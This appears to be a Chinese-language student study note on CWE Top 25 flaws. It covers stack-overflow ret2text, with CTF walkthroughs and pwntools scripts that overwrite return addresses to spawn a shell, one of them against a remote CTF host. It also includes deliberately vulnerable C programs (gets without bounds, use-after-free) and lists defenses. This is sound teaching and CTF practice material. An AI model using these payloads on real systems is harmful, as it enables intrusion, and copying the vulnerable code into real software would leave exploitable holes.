# HWAST TOP 10

![image.png](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202405101642370.png)

# CWE TOP25 
![image.png](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202405101642430.png)

# Exploit Description
## Out Of Bounds Write
**Out-of-bounds Write** 漏洞指的是当程序在尝试写入数据到一个数据缓冲区（比如数组）时，写入的位置超出了为该缓冲区预设的内存边界。这种漏洞可以导致多种安全问题，包括数据损坏、系统崩溃以及安全漏洞，有时还可能被利用执行任意代码。
这一漏洞在遇到未明确定义大小的数据结构，内存野指针时会有比较明显的威胁，恶意代码可以通过溢出方式进入内存并执行
**以下以一个简单的栈溢出（Stack Overflow）来描述该漏洞的一种实际运用**。
### Stack Overflow
当一个函数正在运行的时候，栈内的状态应该是这样的：

<img src="https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159326.png" style="zoom:50%;" />

ReturnAddress内保存返回地址，这样放是为了退栈时将这个值返回给eip寄存器。在入栈时eip寄存器首先保存了进行调用之后的下一条指令地址，这样才能确保调用函数可以调用到被调用函数。

Caller's ebp 调用函数的基地址，退栈时这个地址进入ebp，使ebp回到指向的原来的栈底。

（之前没理解且比较抽象的一点就是：为什么说是把被调用函数的地址压栈但是实际存储的时调用函数的地址，事实上当caller's ebp作为栈顶时，其存储的确实是调用函数的基地址，但ebp的位置其实是处在被调用函数的基地址上的，同时当退栈的时候，战中的内容被重新写给ebp，也就达到了回到原位置的效果。）

退栈：先退出被调用函数的局部变量，再退出调用函数的基地址并进入ebp使ebp回到原地址，再退出返回地址并放入eip，这样整个调用函数和寄存器的状态回到了无被调用函数的时候。

#### 哪里能出现栈溢出？

在进出栈过程中，可以通过修改函数状态来进行攻击，而保存状态的寄存器eip就是核心。通过让eip载入包含攻击指令的“地址”达到目的。

比如，在退栈过程中，可以用攻击指令所在的地址覆盖本应该返回的返回地址。

同样的，在入栈过程中，可以通过让eip指向的函数地址改变为攻击指令所在的地址来达到攻击效果。

#### ShellCode-RET2TEXT

<img src="https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159327.png" style="zoom:50%;" />

基本构造如上图所示。

**payload :** padding1 + address of shellcode + padding2 + shellcode

几个注意点：

1.padding1的目的是把被调用函数的变量全部覆盖为乱七八糟的东西并且长度正好要达到返回地址之前（字符串不可以包含\x00否则会有截断）

2.Address of shellcode 即把shellcode所在的地址覆盖eip返回地址

3.padding1 长度任意

4.当ida/pwndbg等返回的shellcode起始地址不一样时，可以通过在 padding2 里填充若干长度的 “\x90”解决。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处

5.shellcode必须使用十六进制机器码编写。

#### 攻防世界 Level0 RET2TEXT

先说几个比较常见的快捷键（毕竟第一次用ida并没有昨天借机子操作时侯的窗口）

*在一个窗口内可以右键在text view/graph view内切换。

*按下F5可以查看选取函数的伪代码（就是C语言输入的代码）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159328.png)

很显然这个vulnerable_function是一个可疑函数，点进去看看

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159329.png)

首先定义一个长度为0x80的字符串，但第二句0x200uLL说明可以最多向其中输入0x200的内容。可以使用shellcode

进入buf看下栈结构：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159330.png)

注意看上面的解释：r和s分别代表返回地址和保存的寄存器，栈长度0x80,寄存器长度0x8。

<img src="https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159326.png" style="zoom:50%;" />

也就是说，只要把Local variable和caller's ebp全部用垃圾数据填满，就可以直接覆写return address。

找敏感函数的返回地址：callsystem

```c
int callsystem()
{
  return system("/bin/sh");

```

相当于直接打开shell。

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159331.png)

函数地址：0x400596（一定要注意，返回的地址需要是函数的地址，这样才能保证该函数被调用）

shellcode:

```python
from pwn import *
p = remote('61.147.171.105',56876)
address = p64(0x400596)
p.send(b'a'*0x88+address) 
p.interactive()
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159332.png)

用不了vim的原因是远程控制的主机并没有装vim。。。

一些基本指令：

from pwn import * #加载pwntools库

p = remote('61.147.171.105',56876) 根据端口/ip连接

interactive()#允许交互

recv(numb=字节大小, timeout=default)# 接收指定字节数

recvall() # 一直接收直到达到文件EOF


#### Anonymous m32 RE2TEXT&CTF-wiki RET2TEXT

源码：

```C
#include <stdio.h>
#include <string.h>

void success() { puts("小黑子露出鸡脚了吧，哥哥下的蛋你别吃"); }

void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}

int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

编译：

```C
gcc -m32 -fno-stack-protector -no-pie JNTM.c -o JNTM
```

*一开始还在纠结找不到32位的题怎么办，结果发现直接编不就行了吗（*

复习一下各个指令：

-m32：编译为32为可执行程序

-fno-stack-protector：关闭栈溢出保护

-no-pie：关闭地址随机化

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159333.png)

编译器会提示gets是不安全的函数，因为它没有对输入的字符长度做任何限制。

**gets函数原型：**char*gets(char*buffer);//读取字符到数组：gets(str);str为数组名。
　　gets函数功能：从键盘上输入字符，直至接受到换行符或EOF时停止，并将读取的结果存放在buffer指针所指向的字符数组中。读取的换行符被转换为null值，做为字符数组的最后一个字符，来结束字符串。

**fgets函数原型：**char *fgets(char *s, int n, FILE *stream);//
我们平时可以这么使用：fgets(str, sizeof(str), stdin);其中str为数组首地址，sizeof(str)为数组大小，stdin表示我们从键盘输入数据。
fgets函数功能：从文件指针stream中读取字符，存到以s为起始地址的空间里，知道读完N-1个字符，或者读完一行。　注意：调用fgets函数时，最多只能读入n-1个字符。读入结束后，系统将自动在最后加’\0’，并以str作为函数值返回。

为什么只能读n-1个字符？因为\0实际上占了一个字符位。而多出这个范围的字符会被存储在缓冲区中。

用IDA看看函数发育的正不正常（：

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159334.png)

从这里可以看出来，变量所在位置是EBP地址-14h；

被调用函数的返回地址是EBP地址+4h

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159335.png)

vulnerable函数地址为0x80491C7（但这个其实是没用的，因为需要的不是vulnerable（）函数）

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159336.png)

success函数地址为0x8049166；

下面做一个简单的计算

vulenerable函数的返回地址就是EBP地址+4h=变量s地址+14h+4h=变量s地址+18h

所以需要填充18h字符长度的垃圾数据+success的地址即可

（18十六进制=24十进制，所以其实这里也可以用20个字符再加上ebp的地址，达到的是同样的效果（*垃圾教程还不如不看*））

shellcode:

```python
from pwn import *
cd = process("./JNTM")
whatever = 0x8049166
cd.sendline(b'A'*0x18 + p32(whatever))
cd.interactive()
```

![](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202404151159337.png)

### 防御方法
1. **代码审查和静态分析**：通过代码审查和使用静态分析工具来识别可能的越界写入代码。
2. **动态分析工具**：使用如AddressSanitizer等动态分析工具在运行时检测和防止越界写入。
3. **使用安全的编程实践**：例如，在C/C++中使用`std::vector`或其它安全容器代替原生数组。
4. **输入验证**：确保对所有外部输入进行适当的大小和类型检查。
## XSS

 XSS（跨站脚本攻击，Cross-Site Scripting） 是一种常见的网络安全漏洞，它允许攻击者将恶意脚本注入到其他用户在浏览器上看到的正常网页中。当其他用户浏览含有恶意脚本的网页时，这些脚本就会在用户的浏览器上执行，攻击者可以利用这些脚本做出各种恶意行为，比如窃取用户的敏感信息、伪造用户身份进行操作等。
 详细的XSS漏洞请参见：XSS Archive.pdf

## SQL Injection
**SQL注入（SQL Injection）** 是一种常见的网络安全攻击技术，它允许攻击者通过在应用程序的输入字段中插入或“注入”恶意的SQL命令，来操纵后端数据库。这种攻击可以让攻击者绕过身份验证、窃取数据、修改数据库内容甚至有可能获得主机的控制权。
详细的SQL注入漏洞请参见：SQL_Injection(SQLiLabs)1&2.pdf

## Use After Free
**Use After Free (UAF)** 漏洞是一种常见的安全问题，主要影响使用手动内存管理的编程语言，如C和C++。这种漏洞发生在程序在释放了内存后仍然尝试使用这块内存时。如果攻击者能够控制或预测这块已释放内存的再次利用，他们可能能执行任意代码，导致数据泄露、服务拒绝或其他安全问题。

### UAF漏洞的产生机制

1. **分配内存**：程序分配了一块内存用于存储数据。
2. **释放内存**：当这块内存不再需要时，程序释放了它。
3. **使用释放后的内存**：由于程序设计错误，程序在释放内存后，仍然尝试访问这块内存。此时，这块内存可能已经被操作系统重新分配给其他程序或数据。

### Example
``` c
#include <err.h>
#include <stdio.h>
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h>
#define BANNER \ "FLAG{THIS_IS_UAF}"
struct auth{
	char name[32];
	int auth;
};
struct auth *auth;
char *service;
int main(int argc,char **argv){
	char line[128];
	printf("%s\n" , BANNER);
	while(1){
		printf("[ auth = %p, service = %p ]\n", auth, service);
		if (fgets(line, sizeof(line), stdin) == NULL) break;
		if (strncmp(line, "auth ", 5) == 0) {
		    auth = malloc(sizeof(struct auth));
		    memset(auth, 0, sizeof(struct auth));
		    if (strlen(line + 5) < 31) {
	          strcpy(auth->name, line + 5);
		        }
	    	}
    	if (strncmp(line, "reset", 5) == 0) {
		    free(auth);
    		}
    	if (strncmp(line, "service", 6) == 0) {
      		service = strdup(line + 7);
    		}
    	if (strncmp(line, "login", 5) == 0) {
      		if (auth && auth->auth) {
        		printf("you have logged in already!\n");
      		} else {
        		printf("please enter your password\n");
      			}		
    		}
  	}
}    
```
* `auth`命令进行用户注册；`reset`命令对建立的用户进行释放；`service`命令写入一个数据并将其复制到分配的heap上；`login`命令进行登录的判断。
* 在使用login指令进行登录的时候，会进行两个判断，一个是auth是否存在，再一个是auth对应的auth字段是否有值存在。
* auth结构体的结构是，先是32个bytes的buffer，然后跟的是一个auth的int数值。所以我们的目的就是想办法将这个auth值覆盖为不为0的数值。auth指令用途是调用`malloc()`函数分配一个auth结构体大小的空间，然后对name进行赋值，这里进行了拷贝数据长度的检测，所以不能直接通过buffer overflow对auth数据进行修改。在分配完空间后，会使用事先定义的`*auth`指针指向这个分配的区域。
* **可以很明显的发现，auth指针被free后并没有指定之后的值，而只是指向的内存空间被释放。`auth`仍然指向之前的内存地址。如果此后执行`login`命令，程序会检查一个已释放的内存地址的`auth`字段**
![image.png](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202405101723670.png)
在每次reset后，auth的地址不会发生改变，可以以此为目的使其指向某个恶意代码块。此时运行service:
![image.png](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202405101724497.png)
service指向了auth指向的相同地址。因为service调用了strdup()函数：
![image.png](https://cdn.jsdelivr.net/gh/IssacL04/IHS@img/img/202405101725587.png)
调用malloc函数在heap上分配空间，然后通过memcpy对内存进行复制。 **`malloc()`函数存在一个特性是会将新申请分配的空间分配到之前被`free()`回收的buffer区域**。这也就形成了uaf漏洞可以被利用的第二个条件，使用malloc()函数重新分配空间。 这样就可以通过service命令对在login时检测的auth指针对应的buffer数据段进行修改和覆盖。


### 如何防御UAF漏洞

预防和缓解Use After Free漏洞的策略包括：

1. **使用智能指针**：在C++中使用智能指针（如`std::unique_ptr`和`std::shared_ptr`）可以帮助自动管理内存生命周期，减少手动释放内存的错误。
2. **代码审查和静态分析**：通过代码审查和静态分析工具来检测潜在的UAF漏洞。
3. **动态检测工具**：使用如AddressSanitizer等动态检测工具在开发和测试阶段捕获UAF漏洞。
4. **内存安全的编程语言**：考虑使用内存安全的编程语言（如Rust），这类语言设计了防止此类内存错误的机制。
5. **最小化裸指针使用**：减少裸指针的使用，并确保其使用在控制之下，尽可能通过封装或其他机制来管理内存。

。